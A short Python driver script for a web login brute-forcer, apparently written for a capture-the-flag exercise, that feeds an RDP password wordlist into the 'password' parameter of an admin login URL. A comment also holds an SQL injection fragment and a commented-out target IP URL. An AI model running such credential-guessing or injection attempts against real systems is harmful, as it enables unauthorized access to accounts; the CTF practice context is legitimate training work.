from pprint import pprint

from source.brute import Brute
from source.dictionary import Dictionary
from source.url_preparation import UrlPreparation

# TODO multithreading
# TODO running with args
# TODO using UserAgents for requests
# TODO using HTTP headers
# TODO using HTTP cookie, session
# TODO add tuning delay between request
# TODO add tuning request waiting time

if __name__ == '__main__':
    # url = 'http://80.249.131.31:8084/?file=temp.txt'
    url = 'https://ctf.school:5003/?login=admin&password=1234'
    # "+and+1%3D1%23
    # param = 'file'
    param = 'password'
    # nonexistent_string = 'не найден'
    nonexistent_string = 'Login page'
    result_file = 'result.txt'
    # wordlist = 'wordlist.txt'
    wordlist = 'rdp_passlist.txt'
    try:
        request = UrlPreparation(url=url, brute_param=param)
        dictionary = iter(Dictionary(path=wordlist, coding='cp1251', added_ending=''))
    except Exception as exc:
        print(exc)
    else:
        new_brute = Brute(request=request, dictionary=dictionary, nonexistent_string=nonexistent_string, result_file=result_file)
        result = new_brute.get_brute()
        pprint(f'Brute result:{result}')
